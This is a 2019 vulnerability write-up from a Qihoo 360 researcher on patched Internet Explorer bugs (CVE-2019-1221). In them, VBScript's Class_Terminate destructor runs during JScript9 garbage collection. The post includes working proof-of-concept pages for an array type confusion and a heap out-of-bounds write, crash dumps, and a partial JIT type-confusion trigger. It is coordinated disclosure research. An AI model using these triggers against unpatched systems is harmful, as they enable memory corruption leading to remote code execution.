**Author: Yuki Chen @ Qihoo 360 Vulcan Team**  
**Date: 2019/09/11**  
**Source:<https://mp.weixin.qq.com/s/M7tUw8E_qsqK7HxMyxS7Yw>**

As a script engine enthusiast, recently I did some research on all the major
script engines on Windows system (VBScript, JScript, JScript9 and ChakraCore)
and discovered/exploited some interesting bugs which also helped me to get #1
in this year’s Microsoft MSRC’s most valuable researcher list :). Now most of
the bugs have been fixed so I decided to have some writeups about them (maybe
in a series of blogs).

In this blog I will discuss a type of interesting cases I reported to
Microsoft on June 2019. These cases are about how a VBScript feature can cause
troubles in JavaScript engine and brings us easy-to-exploit bugs. This attack
vector has existed for quite a long time (since the born of jscript9 in
Internet Explorer 9) and was not discussed before. By the time of this blog,
all these cases have been fixed (in September CPU). And because now VBScript
has been disabled in Internet Zone by default in Internet Explorer both on
Windows 7 and Windows 10, I think it would be safe to disclose them.

### Background

The VBScript engine supports custom class definition. When you define a
VBScript class, you can specify a special function named “Class_Terminate”.
The “Class_Terminate” function acts like a destructor function and will be
called when the class object is released (In VBScript engine, it means when
there is no reference to the class object).

Below is a simple example of how the “Class_Terminate” works:

    
    
    Class cla0
     Private Sub Class_Terminate
        msgbox "Class_Terminate called!"
     End Sub
    End Class
    Set o = new cla0
    Set o = Nothing     

In the above example, the “Class_Terminate” function will get called
immediately when execute the assign statement “Set o = Nothing”. This is
because object in VBScript engine is stored as VT_DISPATCH variant and is
managed by reference counter. The assign statement will decrease the reference
counter of o, and when the reference counter becomes 0, the Class_Terminate
function will get called, as shown in the below code snippet.

![image.png](https://images.seebug.org/content/images/2019/09/11/1568183230000-1cfhhd.png-w331s)

This “Class_Terminate” feature has already caused many vulnerabilities in
VBScript engine, for example the ITW 0day CVE-2018-8174 we caught last year:

<http://blogs.360.cn/post/cve-2018-8174-en.html>

And the new variants we found based on CVE-2018-8174:

<http://blogs.360.cn/post/from-a-patched-itw-0day-to-remote-code-execution-part-i-from-patch-to-new-0day.html>

But this time I want to jump out of the VBScript engine to see whether it can
cause some problems in other components.

**When VBScript meets JavaScript, and Class_Terminate meets Garbage
Collection**

As you may know, in Internet Explorer, you can use multiple script languages
(e.g. VBScript and JavaScript) in one web page. And the different script
languages can interact with each other. Now consider the following example:

    
    
    <script type="text/vbscript">Class cla0 Private Sub Class_Terminate    msgbox "Class_Terminate called!" End SubEnd ClassSet o = new cla0</script><script language="javascript">o = null;            <============(1) Class_Terminate triggered here?CollectGarbage();        <============(2) Or Class_Terminate triggered here?</script>

The above example creates a class object in VBScript, and then set the variant
to null in JavaScript. We already know that clearing all references to a
VBScript object can trigger its’ “Class_Terminate” function, now guess which
JavaScript statement in the above example will actually trigger the
“Class_Terminate”? Is it statement (1) which sets |o| to null; or some other
statement?

The answer is, to my surprise, it’s statement (2) which will trigger the
“Class_Terminate” callback of the object. By some reversing/debugging we
finally figures out what happens here:

1.When we access the VBScript object |o| in JavaScript, the JS engine will
create a JavaScript “wrapper” object for it (called a HostVariant).

  1. The wrapper object will increase the reference counter of the VBScript object by one when it is initialized. And release the reference counter by 1 when itself is freed.
  2. Since the wrapper object is a JavaScript object, it is managed by the JavaScript Garbage Collection mechanism. So simply set the object to null will not free (dispose) the object immediately, it will not be freed until it is collected by the GC engine.

Below is a stack trace when the Class_Terminate function is called:

    
    
    05 060ad038 675457e6 VBSCRIPT!VBScriptClass::TerminateClass+0xa1
    06 060ad054 64fc6f39 VBSCRIPT!VBScriptClass::Release+0x36
    07 060ad080 64fd4e7a JSCRIPT9!SmallFinalizableHeapBlock::DisposeObjects+0x1f9
    08 060ad0a8 64fd4abf JSCRIPT9!HeapInfo::DisposeObjects+0xca
    09 060ad0d8 64fdb830 JSCRIPT9!Recycler::DisposeObjects+0x47
    0a 060ad0dc 64fdaf57 JSCRIPT9!Recycler::FinishDisposeObjects+0x1a
    0b 060ad0f4 64fcd932 JSCRIPT9!Recycler::FinishCollection+0x76
    0c 060ad104 64fd58a5 JSCRIPT9!Recycler::CollectOnConcurrentThread+0x97
    0d 060ad130 64fdb436 JSCRIPT9!Recycler::DoCollect+0xf5
    0e 060ad144 64fdb3f9 JSCRIPT9!DefaultRecyclerCollectionWrapper::ExecuteRecyclerCollectionFunction+0x26
    0f 060ad17c 650b7f69 JSCRIPT9!ThreadContext::ExecuteRecyclerCollectionFunctionCommon+0x39
    10 060ad1bc 64fdb8d9 JSCRIPT9!ThreadContext::ExecuteRecyclerCollectionFunction+0xb9
    11 060ad1fc 6519b9c4 JSCRIPT9!Recycler::DoCollectWrapped+0x5f
    12 060ad208 65213c92 JSCRIPT9!Recycler::Collect<-1073475584>+0x53
    **13 060ad220 650b9ae3 JSCRIPT9!Js::GlobalObject::EntryCollectGarbage+0x72**

This means we can trigger a callback and execute arbitrary script code during
a JavaScript garbage collection operation. Can we abuse this behavior to cause
some security bugs? The answer is Yes.

By simply checking where Garbage Collection will be triggered in the JS engine
code, we found the below code chain is useful (and there might be others):

    
    
    05 0617ca7c 675457e6 VBSCRIPT!VBScriptClass::TerminateClass+0xa1
    06 0617ca98 64fc6f39 VBSCRIPT!VBScriptClass::Release+0x36
    07 0617cac4 64fd4e7a JSCRIPT9!SmallFinalizableHeapBlock::DisposeObjects+0x1f9
    08 0617caec 64fd4abf JSCRIPT9!HeapInfo::DisposeObjects+0xca
    09 0617cb1c 64fdb830 JSCRIPT9!Recycler::DisposeObjects+0x47
    0a 0617cb20 6508de9b JSCRIPT9!Recycler::FinishDisposeObjects+0x1a
    0b 0617cb3c 64fdb44f JSCRIPT9!Recycler::FinishConcurrentCollect+0x10b
    0c 0617cb50 64fdb3f9 JSCRIPT9!DefaultRecyclerCollectionWrapper::ExecuteRecyclerCollectionFunction+0x3f
    0d 0617cb88 650b7f69 JSCRIPT9!ThreadContext::ExecuteRecyclerCollectionFunctionCommon+0x39
    0e 0617cbc8 6509dcd9 JSCRIPT9!ThreadContext::ExecuteRecyclerCollectionFunction+0xb9
    0f 0617cc00 6509dc26 JSCRIPT9!Recycler::FinishConcurrentCollectWrapped+0x57
    10 0617cc0c 64fd615a JSCRIPT9!Recycler::TryFinishConcurrentCollect<404819971>+0x6e
    11 0617cc20 64fd53de JSCRIPT9!Recycler::TryLargeAlloc+0x71
    12 0617cc48 64feb4f5 JSCRIPT9!Recycler::LargeAlloc+0x2f
    **13 0617cc6c 64fcace3 JSCRIPT9!Recycler::AllocZero+0xe5**

The above call stack shows that we can trigger a GC when allocating some
memory in the JS engine. This is quite useful for us. Because the memory
allocation operations are quite common in the JS engine and if the developers
are not aware of possible callbacks in the operation, it can cause big
problems.

Let’s take a look at some examples.

**Let’s party!**

### Case 1: Type Confusion in Push Function of JavaScript Native Arrays

In Jscript9, there are different types of arrays including NativeIntArray,
NativeFloatArray and the VarArray. Some array runtime functions contain fast
paths for different types of arrays to improve speed. The Array.prototype.push
function is one of them.

In the implementation of the push function, if current array is a native
array, it will go to the fast path for native array. In the fast path code,
when pushing the elements to the array, if current array segment is not big
enough, it will:

1.Resize the segment. 2.Store the element into the resized segment.

Step 1 will allocate a new segment for the array. By using the
“Class_Terminate” and the GC trick, we can execute arbitrary script in step 1.
If we change the native array to var array (object array) in our callback, we
can cause a type confusion which is easy to exploit.

Below is the PoC:

    
    
    <meta http-equiv="x-ua-compatible" content="IE=8">
    <script language='javascript'>
    var arr = new Array();
    var arr_arr = new Array();
    var stop = false;
    function ff()
    {
        var old_length = arr_arr.length;
        arr_arr.length = 1;    
        arr_arr[0] = {};
        arr_arr.length = old_length;
        stop = true;
    }
    </script>
    <script type="text/vbscript">
    Dim o
    Class cla0
     Private Sub Class_Terminate
          Call ff
      End Sub
    End Class
    function f1
        Set o = Nothing
    end function
    Set o = new cla0
    </script>
    <script language='javascript'>
    arr.push(o);
    o = null;
    arr[0] = null;
    try {
    for (var i = 0; i < 0x10000000 && !stop; ++ i){
        arr_arr.push(-(0x100000000 - 0x88888888));
    }
    } catch (e){
        alert(e);
    }
        alert(arr_arr.pop());
    </script>

If you open the PoC with the vulnerable version of Internet Explorer 11, it
will crash when using the integer value 0x88888888 as an object:

(4d54.312c): Access violation - code c0000005 (!!! second chance !!!)
eax=0604d0a6 ebx=88888888 ecx=08f5907e edx=00214e48 esi=00000006 edi=08f5907e
eip=65000f89 esp=0604d070 ebp=0604d088 iopl=0 nv up ei pl zr na pe nc cs=0023
ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010246
jscript9!ValueType::Merge+0x19: 65000f89 8b0b mov ecx,dword ptr [ebx]
ds:002b:88888888=????????

### Case 2: Heap Buffer OOB write in JavaScirptArray::EntryShift

The below PoC will trigger a heap oob write in JavaScriptArray::EntryShift:

    
    
    <meta http-equiv="x-ua-compatible" content="IE=8">
    <script language='javascript'>
    var a2 = new Array(100);
    var cur = 0;
    var arr = new Array();
    var arr_arr = new Array();
    var stop = false;
    function ff()
    {
        a2[cur][0x13fb00] = 0;
        stop = true;
    }
    </script>
    <script type="text/vbscript">
    Dim o
    Class cla0
     Private Sub Class_Terminate     
          Call ff
      End Sub
    End Class
    function f1
        Set o = Nothing
    end function
    Set o = new cla0
    </script>
    <script language='javascript'>
    var seg_size = 0x400;
    var seg_off = 0x100;
    var next_seg_left = seg_size + seg_off;
    var next_seg_size = 0x100000;
    for (var i = 0; i < a2.length; ++ i)
        a2[i] = {};
    for (var k = 0; k < a2.length; ++ k) {
        arr_arr = [{}];
        for (var i = 0; i < seg_size; ++ i)
            arr_arr[i] = -1;
        for (var i = next_seg_left; i < next_seg_left + next_seg_size; ++ i)
            arr_arr[i] = -1;
        for (var i = 0; i < seg_off; ++ i)
            arr_arr.shift();
        a2[k] = arr_arr;
    }
    arr.push(o);
    o = null;
    arr[0] = null;
    function fff()
    {
    for (cur = 0; cur < a2.length; ++ cur) {
        a2[cur].shift();
    }
    location.href = location.href;
    }
    setTimeout(fff, 1);
    </script>

And what happens in this PoC:

In JavaScriptArray::EntryShift, if the shift operation causes the head segment
and head->next segment to overlap, it will try to merge the 2 segments by:

1.Allocate a new segment whose size is big enough to hold elements in the two
segments.

2.Copy the elements in head and head->next into the new allocated segment.

By using the GC & Class_Terminate trick here we can trigger a callback at step
(1). And if we grow the size of the head segment inside the callback, after
returned from the callback, the new allocated segment will have insufficient
size to hold the new elements. This will result in a heap buffer OOB write.
This vulnerability could be leveraged to achieve reliable remote code
execution easily as well.

The crash info for this PoC looks like this:

    
    
    (4e7c.372c): Access violation - code c0000005 (!!! second chance !!!)
    eax=2d68dc28 ebx=2d190010 ecx=0003bb09 edx=00000000 esi=2d59f004 edi=0b510000
    eip=74b995fa esp=05a0d0ac ebp=05a0d0b4 iopl=0         nv up ei pl nz ac pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
    msvcrt!memmove+0x5a:
    74b995fa f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
    0:009> k
    ChildEBP RetAddr  
    05a0d0b4 67e1f2db msvcrt!memmove+0x5a
    05a0d150 67d35ccd jscript9!Js::JavascriptArray::EntryShift+0xea20b
    05a0d170 67d1f4ec jscript9!Js::InterpreterStackFrame::DoProfiledSetProperty<Js::OpLayoutElementRootCP_OneByte const >+0xc9
    05a0d1a8 67d21808 jscript9!Js::InterpreterStackFrame::OP_ProfiledLoopBodyStart<0,1>+0xdc
    05a0d1d8 67d20eb9 jscript9!Js::InterpreterStackFrame::Process+0x5b8
    05a0d304 08b00fd9 jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x2a9

### Case 3: Type Confusion in JIT Engine

A more interesting case is that we can use this trick to cause vulnerabilities
in the JavaScript JIT engine. Consider the following PoC:

    
    
    function func(a, b, c) {
        a[0] = 1.2;            <============ (1)
        var bb = {p0:1,p1:1,..., p2866:1};    <============ (2)
        a[1] = 2.3023e-320;        <============ (3)
        a[0] = 2.3023e-320;
    }
    var a = [1.1, 2.2, 3.3, 4.4];
    …
    for (; i < 0x100000 && !stop; ++ i) {
        func(a, i, i);
    }

If we call the function |func| multiple times, and each time the parameter |a|
is a JavaScriptNativeFloatArray, the JIT engine will compile & optimize |func|
like this:

At (1), it will make sure |a| is a JavaScriptNativeFloatArray.

The statement at (2) simply initializes an object with multiple int
properties, the JIT engine will think that this statement will have no side-effect.

Then at (3), JIT engine will think that |a| is still a
JavaScriptNativeFloatArray.

However, the statement at (2) will allocate memory space to store the
properties in the object, so we can trigger a callback using our trick. And of
course, we can change the float array |a| to a var array, which can cause a
type confusion issue that is easy and reliable to exploit. We also developed a
PoC which pops a calculator by exploiting this JIT confusion issue (see
“jit_calc.html” in the repository).

You can find all the PoCs from my github repository:

<https://github.com/guhe120/browser/tree/master/GC>

The PoCs were tested and confirmed to work on windows 10.0.18362.295. To test
the PoC, right-click the PoC and chose “open with” => “Internet Explorer”. The
PoC may not work if you put it under a web server by default, because
Microsoft has disabled VBScript execution for Internet Zone both on Windows 7
(Since August 2019) and Windows 10.

![1.gif](https://images.seebug.org/content/images/2019/09/11/1568183233000-2chkql.png-w331s)

### Conclusion

The above cases are just examples of how to exploit this issue. There are many
other places in the JavaScript engine where we can trigger a callback using
this trick and cause exploitable conditions. We have reported all the cases to
Microsoft, all the cases are fixed as CVE-2019-1221 released in September. A
quick analysis shows that the issues are addressed by disabling object dispose
(free) in GC when the GC is triggered by memory allocation.

I think this case is quite interesting because the “Class_Terminate” function
itself is just a feature in VBScript which seems no harm. But when we combine
this feature with other features in other modules (the JavaScript engine in
this article, or some other modules which we may introduce in later blogs), we
can get exploitable vulnerabilities. While there are lots of vulnerabilities
discovered inside a single script engine (VBScript, Jscript9, …) these years,
the bugs we discussed in this blog existed since the born of the Jscript9
engine and lived for quite a long period. I think one of the reasons for the
long living is that we need to think cross the boundary of a single script
engine and try to combine the VBScript/Jscript engines together in order to
discover them. This also reminds me to think broadly when doing bug hunting.

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1032/>

